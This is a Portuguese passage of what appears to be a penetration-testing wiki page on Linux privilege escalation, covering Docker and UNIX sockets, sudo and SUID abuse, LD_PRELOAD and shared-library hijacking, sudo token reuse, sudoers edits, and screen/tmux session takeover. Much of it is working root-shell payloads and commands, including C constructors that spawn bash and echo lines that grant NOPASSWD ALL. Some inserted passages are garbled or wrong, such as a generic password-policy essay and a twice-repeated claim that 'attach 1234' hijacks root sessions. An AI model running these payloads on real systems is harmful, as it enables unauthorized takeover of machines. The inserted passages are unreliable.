A conexão bruta é uma técnica utilizada para estabelecer uma conexão direta com um sistema alvo, sem a necessidade de autenticação. Isso pode ser útil durante um teste de penetração para explorar vulnerabilidades e obter acesso privilegiado ao sistema.

Existem várias ferramentas disponíveis para estabelecer uma conexão bruta, como o Netcat e o Telnet. Essas ferramentas permitem que você se conecte a uma porta específica em um sistema remoto e interaja com ele diretamente.

No entanto, é importante ressaltar que o uso da conexão bruta pode ser ilegal e violar a privacidade e a segurança de um sistema. Portanto, é fundamental obter permissão adequada antes de realizar qualquer teste de penetração e garantir que você esteja agindo dentro dos limites legais e éticos.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemplo de exploração:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Sockets HTTP

Observe que pode haver alguns **sockets ouvindo por requisições HTTP** (_Não estou falando sobre arquivos .socket, mas sim sobre arquivos que atuam como sockets unix_). Você pode verificar isso com:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se o socket **responder com uma solicitação HTTP**, então você pode **comunicar** com ele e talvez **explorar alguma vulnerabilidade**.

### Socket Docker Gravável

O **socket do docker** geralmente está localizado em `/var/run/docker.sock` e só pode ser gravado pelo usuário `root` e pelo grupo `docker`.\
Se, por algum motivo, **você tiver permissões de gravação** nesse socket, poderá elevar privilégios.\
Os seguintes comandos podem ser usados para elevar privilégios:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### Usar a API web do Docker a partir do socket sem o pacote Docker

Se você tem acesso ao **socket do Docker**, mas não pode usar o binário do Docker (talvez nem esteja instalado), você pode usar a API web diretamente com o `curl`.

Os comandos a seguir são um exemplo de como **criar um contêiner do Docker que monta a raiz** do sistema host e usa o `socat` para executar comandos no novo contêiner do Docker.
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
O último passo é usar o `socat` para iniciar uma conexão com o contêiner, enviando uma solicitação de "attach".
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
Agora você pode executar comandos no contêiner a partir desta conexão `socat`.

### Outros

Observe que se você tiver permissões de gravação sobre o socket do Docker porque você está **dentro do grupo `docker`**, você tem [**mais maneiras de elevar privilégios**](interesting-groups-linux-pe/#docker-group). Se a [**API do Docker estiver ouvindo em uma porta**, você também pode comprometê-la](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Verifique **mais maneiras de escapar do Docker ou abusar dele para elevar privilégios** em:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Escalação de privilégios do Containerd (ctr)

Se você descobrir que pode usar o comando **`ctr`**, leia a seguinte página, pois **você pode ser capaz de abusar dele para elevar privilégios**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Escalação de privilégios do **RunC**

Se você descobrir que pode usar o comando **`runc`**, leia a seguinte página, pois **você pode ser capaz de abusar dele para elevar privilégios**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUS é um **sistema de comunicação interprocessos (IPC)**, fornecendo um mecanismo simples, porém poderoso, **permitindo que aplicativos se comuniquem entre si**, troquem informações e solicitem serviços. O D-BUS foi projetado do zero para atender às necessidades de um sistema Linux moderno.

Como um sistema IPC e de objetos completo, o D-BUS tem vários usos pretendidos. Primeiro, o D-BUS pode realizar IPC básico entre aplicativos, permitindo que um processo envie dados para outro - pense em **sockets de domínio UNIX turbinados**. Em segundo lugar, o D-BUS pode facilitar o envio de eventos ou sinais pelo sistema, permitindo que diferentes componentes do sistema se comuniquem e, em última análise, se integrem melhor. Por exemplo, um daemon Bluetooth pode enviar um sinal de chamada recebida que seu player de música pode interceptar, diminuindo o volume até o fim da chamada. Por fim, o D-BUS implementa um sistema de objetos remotos, permitindo que um aplicativo solicite serviços e invoque métodos de um objeto diferente - pense no CORBA sem as complicações. (De [aqui](https://www.linuxjournal.com/article/7744)).

O D-Bus usa um **modelo de permissão permitir/negar**, onde cada mensagem (chamada de método, emissão de sinal, etc.) pode ser **permitida ou negada** de acordo com a soma de todas as regras de política que correspondem a ela. Cada regra na política deve ter o atributo `own`, `send_destination` ou `receive_sender` definido.

Parte da política de `/etc/dbus-1/system.d/wpa_supplicant.conf`:
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
Portanto, se uma política estiver permitindo que seu usuário de alguma forma **interaja com o barramento**, você pode ser capaz de explorá-la para elevar privilégios (talvez apenas listando algumas senhas?).

Observe que uma **política** que **não especifica** nenhum usuário ou grupo afeta a todos (`<política>`).\
Políticas no contexto "padrão" afetam a todos que não são afetados por outras políticas (`<política context="padrão"`).

**Aprenda como enumerar e explorar uma comunicação D-Bus aqui:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Rede**

É sempre interessante enumerar a rede e descobrir a posição da máquina.

### Enumeração genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Portas abertas

Sempre verifique os serviços de rede em execução na máquina com a qual você não conseguiu interagir antes de acessá-la:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifique se você consegue capturar o tráfego. Se conseguir, você pode ser capaz de obter algumas credenciais.
```
timeout 1 tcpdump
```
## Usuários

### Enumeração Genérica

Verifique **quem** você é, quais **privilégios** você possui, quais **usuários** estão no sistema, quais podem **fazer login** e quais têm **privilégios de root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Algumas versões do Linux foram afetadas por um bug que permite que usuários com **UID > INT\_MAX** aumentem seus privilégios. Mais informações: [aqui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aqui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [aqui](https://twitter.com/paragonsec/status/1071152249529884674).\
**Explorá-lo** usando: **`systemd-run -t /bin/bash`**

### Grupos

Verifique se você é **membro de algum grupo** que possa conceder privilégios de root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Área de transferência

Verifique se há algo interessante na área de transferência (se possível)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Senhas

A política de senhas é uma medida de segurança importante para proteger sistemas e dados contra acesso não autorizado. Uma política de senhas eficaz deve ser implementada para garantir que as senhas sejam fortes e seguras. Aqui estão algumas diretrizes para criar uma política de senhas robusta:

- **Comprimento mínimo**: Defina um comprimento mínimo para as senhas, geralmente recomendado entre 8 e 12 caracteres.
- **Complexidade**: Exija que as senhas contenham uma combinação de letras maiúsculas e minúsculas, números e caracteres especiais.
- **Expiração**: Defina um período de expiração para as senhas, geralmente a cada 60 a 90 dias. Os usuários devem ser solicitados a alterar suas senhas regularmente.
- **Histórico de senhas**: Mantenha um histórico de senhas anteriores e impeça que os usuários reutilizem senhas recentes.
- **Bloqueio de conta**: Implemente um mecanismo de bloqueio de conta após um número específico de tentativas de login malsucedidas.
- **Autenticação de dois fatores**: Incentive ou exija a autenticação de dois fatores para adicionar uma camada extra de segurança às contas dos usuários.
- **Educação do usuário**: Forneça treinamento e conscientização aos usuários sobre a importância de senhas fortes e boas práticas de segurança.

Ao implementar uma política de senhas, é essencial equilibrar a segurança com a usabilidade. Certifique-se de que as senhas sejam suficientemente complexas para evitar a adivinhação, mas também fáceis o suficiente para que os usuários possam lembrá-las sem precisar anotá-las.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Senhas conhecidas

Se você **conhece alguma senha** do ambiente, tente fazer login como cada usuário usando a senha.

### Su Brute

Se não se importar em fazer muito barulho e os binários `su` e `timeout` estiverem presentes no computador, você pode tentar forçar a entrada de usuário usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta forçar a entrada de usuários.

## Abusos de PATH graváveis

### $PATH

Se você descobrir que pode **escrever em alguma pasta do $PATH**, talvez seja possível elevar os privilégios criando uma porta dos fundos dentro da pasta gravável com o nome de algum comando que será executado por um usuário diferente (idealmente root) e que **não seja carregado de uma pasta localizada anteriormente** à sua pasta gravável no $PATH.

### SUDO e SUID

Você pode ter permissão para executar algum comando usando sudo ou eles podem ter o bit suid. Verifique usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alguns **comandos inesperados permitem ler e/ou escrever arquivos ou até mesmo executar um comando**. Por exemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

A configuração do Sudo pode permitir que um usuário execute algum comando com os privilégios de outro usuário sem precisar saber a senha.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Neste exemplo, o usuário `demo` pode executar o `vim` como `root`, agora é trivial obter um shell adicionando uma chave ssh no diretório root ou chamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta diretiva permite ao usuário **definir uma variável de ambiente** enquanto executa algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este exemplo, **baseado na máquina HTB Admirer**, estava **vulnerável** a **PYTHONPATH hijacking** para carregar uma biblioteca python arbitrária enquanto executava o script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Bypassando a execução do Sudo através de caminhos

**Pule** para ler outros arquivos ou use **links simbólicos**. Por exemplo, no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se um **curinga** é usado (\*), fica ainda mais fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binário SUID sem caminho de comando

Se a **permissão sudo** for dada a um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_, você pode explorá-lo alterando a variável PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica também pode ser usada se um binário **suid** executa outro comando sem especificar o caminho para ele (sempre verifique com o comando **strings** o conteúdo de um binário suid suspeito).

[Exemplos de payloads para executar.](payloads-to-execute.md)

### Binário suid com caminho do comando

Se o binário **suid** executa outro comando especificando o caminho, então você pode tentar **exportar uma função** com o mesmo nome do comando que o arquivo suid está chamando.

Por exemplo, se um binário suid chama _**/usr/sbin/service apache2 start**_, você deve tentar criar a função e exportá-la:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Então, quando você chama o binário suid, essa função será executada

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** é uma variável de ambiente opcional que contém um ou mais caminhos para bibliotecas compartilhadas, ou objetos compartilhados, que o carregador irá carregar antes de qualquer outra biblioteca compartilhada, incluindo a biblioteca de tempo de execução C (libc.so). Isso é chamado de pré-carregamento de uma biblioteca.

Para evitar que esse mecanismo seja usado como um vetor de ataque para binários executáveis _suid/sgid_, o carregador ignora o _LD\_PRELOAD_ se _ruid != euid_. Para esses binários, apenas bibliotecas em caminhos padrão que também são _suid/sgid_ serão pré-carregadas.

Se você encontrar na saída do comando **`sudo -l`** a frase: _**env\_keep+=LD\_PRELOAD**_ e puder chamar algum comando com sudo, você pode elevar os privilégios.
```
Defaults        env_keep += LD_PRELOAD
```
Salvar como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Em seguida, **compile-o** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **eleve os privilégios** executando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Um privesc semelhante pode ser abusado se o atacante controlar a variável de ambiente **LD\_LIBRARY\_PATH**, pois ele controla o caminho onde as bibliotecas serão procuradas.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binário SUID - Injeção de .so

Se você encontrar algum binário estranho com permissões **SUID**, você pode verificar se todos os arquivos **.so** estão **carregados corretamente**. Para fazer isso, você pode executar:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por exemplo, se você encontrar algo como: _pen("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (Arquivo ou diretório não encontrado)_ você pode explorá-lo.

Crie o arquivo _/home/user/.config/libcalc.c_ com o código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Compile-o usando:
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
## Sequestro de Objeto Compartilhado

O sequestro de objeto compartilhado é uma técnica de escalonamento de privilégios que envolve a substituição de uma biblioteca compartilhada por uma versão maliciosa. Isso permite que um invasor execute código arbitrário com privilégios elevados.

### Identificando bibliotecas vulneráveis

Para identificar bibliotecas vulneráveis, você pode usar a ferramenta `ldd` para listar as dependências de um executável. Procure por bibliotecas que possam ser substituídas ou que possuam permissões de gravação para usuários não privilegiados.

```
$ ldd <binary>
```

### Criando uma biblioteca maliciosa

Para criar uma biblioteca maliciosa, você precisa escrever um código que seja executado quando a biblioteca for carregada. Você pode usar a função `constructor` para isso. Certifique-se de que o código malicioso seja projetado para executar as ações desejadas.

```c
#include <stdio.h>

void __attribute__((constructor)) init(void) {
    // Código malicioso aqui
    printf("Biblioteca maliciosa carregada\n");
}
```

Compile a biblioteca usando o seguinte comando:

```
$ gcc -shared -fPIC -o <malicious_library.so> <malicious_library.c>
```

### Substituindo a biblioteca

Para substituir a biblioteca original pela biblioteca maliciosa, você precisa colocar a biblioteca maliciosa em um diretório que seja pesquisado antes do diretório onde a biblioteca original está localizada. Isso pode ser feito definindo a variável de ambiente `LD_LIBRARY_PATH` para o diretório contendo a biblioteca maliciosa.

```
$ export LD_LIBRARY_PATH=<malicious_library_directory>:$LD_LIBRARY_PATH
```

Em seguida, execute o binário.

## Executando o binário.
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Agora que encontramos um binário SUID carregando uma biblioteca de uma pasta onde podemos escrever, vamos criar a biblioteca nessa pasta com o nome necessário:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se você receber um erro como este:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Isso significa que a biblioteca que você gerou precisa ter uma função chamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) é uma lista selecionada de binários Unix que podem ser explorados por um invasor para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos em que você só pode injetar argumentos em um comando.

O projeto coleta funções legítimas de binários Unix que podem ser abusadas para escapar de shells restritos, elevar ou manter privilégios elevados, transferir arquivos, criar shells de bind e reversos e facilitar outras tarefas de pós-exploração.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Se você pode acessar `sudo -l`, você pode usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se ela encontra alguma regra sudo que possa ser explorada.

### Reutilizando Tokens do Sudo

No cenário em que **você tem um shell como um usuário com privilégios de sudo**, mas não sabe a senha do usuário, você pode **esperar que ele/ela execute algum comando usando `sudo`**. Em seguida, você pode **acessar o token da sessão em que o sudo foi usado e usá-lo para executar qualquer coisa como sudo** (elevação de privilégios).

Requisitos para elevar privilégios:

* Você já tem um shell como usuário "_sampleuser_"
* "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 minutos** (por padrão, essa é a duração do token sudo que nos permite usar `sudo` sem digitar uma senha)
* `cat /proc/sys/kernel/yama/ptrace_scope` é 0
* `gdb` é acessível (você pode fazer upload dele)

(Você pode habilitar temporariamente `ptrace_scope` com `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` e definir `kernel.yama.ptrace_scope = 0`)

Se todos esses requisitos forem atendidos, **você pode elevar privilégios usando:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o token sudo em sua sessão** (você não obterá automaticamente um shell root, faça `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* O **segundo exploit** (`exploit_v2.sh`) criará um shell sh em _/tmp_ **propriedade do root com setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* O **terceiro exploit** (`exploit_v3.sh`) irá **criar um arquivo sudoers** que torna os **tokens sudo eternos e permite que todos os usuários usem o sudo**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Nome de Usuário>

Se você tiver **permissões de escrita** na pasta ou em qualquer um dos arquivos criados dentro da pasta, você pode usar o binário [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) para **criar um token sudo para um usuário e PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver um shell como esse usuário com PID 1234, você pode **obter privilégios sudo** sem precisar saber a senha fazendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

O arquivo `/etc/sudoers` e os arquivos dentro de `/etc/sudoers.d` configuram quem pode usar o `sudo` e como. Por padrão, esses arquivos só podem ser lidos pelo usuário root e pelo grupo root.\
Se você conseguir ler este arquivo, poderá obter algumas informações interessantes, e se puder escrever em qualquer arquivo, poderá elevar os privilégios.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se você pode escrever, você pode abusar dessa permissão.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Outra maneira de abusar dessas permissões:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existem algumas alternativas ao binário `sudo`, como o `doas` para o OpenBSD. Lembre-se de verificar sua configuração em `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Se você sabe que um **usuário geralmente se conecta a uma máquina e usa `sudo`** para elevar privilégios e você obteve um shell dentro do contexto desse usuário, você pode **criar um novo executável sudo** que executará seu código como root e, em seguida, o comando do usuário. Em seguida, **modifique o $PATH** do contexto do usuário (por exemplo, adicionando o novo caminho em .bash\_profile) para que, quando o usuário executar o sudo, seu executável sudo seja executado.

Observe que, se o usuário usar um shell diferente (não bash), você precisará modificar outros arquivos para adicionar o novo caminho. Por exemplo, o [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Você pode encontrar outro exemplo em [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

## Biblioteca Compartilhada

### ld.so

O arquivo `/etc/ld.so.conf` indica **de onde são carregados os arquivos de configuração**. Normalmente, esse arquivo contém o seguinte caminho: `include /etc/ld.so.conf.d/*.conf`

Isso significa que os arquivos de configuração de `/etc/ld.so.conf.d/*.conf` serão lidos. Esses arquivos de configuração **apontam para outras pastas** onde as **bibliotecas** serão **procuradas**. Por exemplo, o conteúdo de `/etc/ld.so.conf.d/libc.conf` é `/usr/local/lib`. **Isso significa que o sistema procurará bibliotecas dentro de `/usr/local/lib`**.

Se, por algum motivo, **um usuário tiver permissões de gravação** em um dos caminhos indicados: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualquer arquivo dentro de `/etc/ld.so.conf.d/` ou qualquer pasta dentro do arquivo de configuração dentro de `/etc/ld.so.conf.d/*.conf`, ele poderá elevar privilégios.\
Dê uma olhada em **como explorar essa configuração incorreta** na seguinte página:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Ao copiar a biblioteca para `/var/tmp/flag15/`, ela será utilizada pelo programa neste local, conforme especificado na variável `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Em seguida, crie uma biblioteca maliciosa em `/var/tmp` com `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

As capacidades do Linux fornecem um **subconjunto dos privilégios de root disponíveis para um processo**. Isso efetivamente divide os privilégios de root em unidades menores e distintas. Cada uma dessas unidades pode ser concedida independentemente a processos. Dessa forma, o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
Leia a seguinte página para **saber mais sobre as capacidades e como abusar delas**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Permissões de diretório

Em um diretório, o **bit "execute"** implica que o usuário afetado pode "**cd**" para a pasta.\
O bit **"read"** implica que o usuário pode **listar** os **arquivos**, e o bit **"write"** implica que o usuário pode **excluir** e **criar** novos **arquivos**.

## ACLs

As ACLs (Listas de Controle de Acesso) são o segundo nível de permissões discricionárias, que **podem substituir as permissões padrão ugo/rwx**. Quando usadas corretamente, elas podem conceder uma **maior granularidade na definição do acesso a um arquivo ou diretório**, por exemplo, dando ou negando acesso a um usuário específico que não é o proprietário do arquivo nem o proprietário do grupo (de [**aqui**](https://linuxconfig.org/how-to-manage-acls-on-linux)).\
**Dê** ao usuário "kali" permissões de leitura e escrita sobre um arquivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obter** arquivos com ACLs específicas do sistema:

```bash
getfacl -R /path/to/directory
```

Este comando irá **recursivamente** listar as ACLs de todos os arquivos e diretórios dentro do diretório especificado. Você pode substituir `/path/to/directory` pelo caminho do diretório que deseja verificar.

Para filtrar os resultados e obter apenas os arquivos com ACLs específicas, você pode usar o comando `grep`. Por exemplo, se você quiser obter apenas os arquivos com a ACL `user::rwx`, você pode executar o seguinte comando:

```bash
getfacl -R /path/to/directory | grep "user::rwx"
```

Isso irá listar apenas os arquivos que possuem a ACL `user::rwx`. Você pode ajustar o padrão de pesquisa no comando `grep` para corresponder a outras ACLs específicas que você esteja procurando.
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessões de shell abertas

Em versões **antigas**, você pode **sequestrar** alguma sessão de **shell** de um usuário diferente (**root**).\
Nas **versões mais recentes**, você só poderá **conectar-se** às sessões de tela do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.

### Sequestrando sessões de tela

**Listar sessões de tela**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Anexar a uma sessão**

Para realizar a escalada de privilégios em um sistema Linux, é necessário primeiro anexar a uma sessão existente com privilégios elevados. Isso pode ser feito usando o comando `attach` seguido pelo ID da sessão. Por exemplo:

```
attach 1234
```

Isso permitirá que você assuma o controle da sessão com privilégios elevados e execute comandos como root. Certifique-se de ter as permissões adequadas para anexar a uma sessão antes de prosseguir com a escalada de privilégios.
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Sequestro de sessões do tmux

Isso era um problema com **versões antigas do tmux**. Eu não conseguia sequestrar uma sessão do tmux (v2.1) criada pelo root como um usuário não privilegiado.

**Listar sessões do tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Anexar a uma sessão**

Para realizar a escalada de privilégios em um sistema Linux, é necessário primeiro anexar a uma sessão existente com privilégios elevados. Isso pode ser feito usando o comando `attach` seguido pelo ID da sessão. Por exemplo:

```
attach 1234
```

Isso permitirá que você assuma o controle da sessão com privilégios elevados e execute comandos como root. Certifique-se de ter as permissões adequadas para anexar a uma sessão antes de prosseguir com a escalada de privilégios.
```bash
